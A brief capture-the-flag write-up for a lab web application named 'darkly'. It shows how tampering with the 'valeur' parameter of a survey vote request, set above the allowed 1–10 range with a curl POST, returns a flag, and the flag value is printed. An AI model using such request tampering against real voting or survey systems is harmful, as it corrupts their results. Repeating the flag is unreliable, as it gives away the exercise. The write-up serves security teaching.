Survey Request Manipulation
===========================

The "Survey" page contains a table, in which you can vote for a certain person. The voting process involves selecting a number from 1 to 10 in a drop-down list. When you vote, the number of votes of that person increments, and grade average is updated.

The request sent from the browser to vote is like this:


```
POST /?page=survey HTTP/1.1
Host: darkly
Content-Length: 16
  [...]
Connection: keep-alive

sujet=2&valeur=5
```

"sujet" is the ID of the person that you vote for, and "valeur" is the grade that you give them.

We can modify the request in a couple of ways, we could change "sujet" to try to fuzz a new ID, we could try to insert strings instead of numbers, and we could just try with arbitrary inputs.

After trying for a while, it seems like if we specify a "valeur" that is greater than 10, we get the flag. Nothing seems to happen with other types of input, like high "sujet" numbers, or strings.


```
$ curl -s -X POST -d 'sujet=2&valeur=11' http://darkly/?page=survey | grep flag
<center><h2 style="margin-top:50px;"> The flag is 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <div style="margin-top:-75px">
```
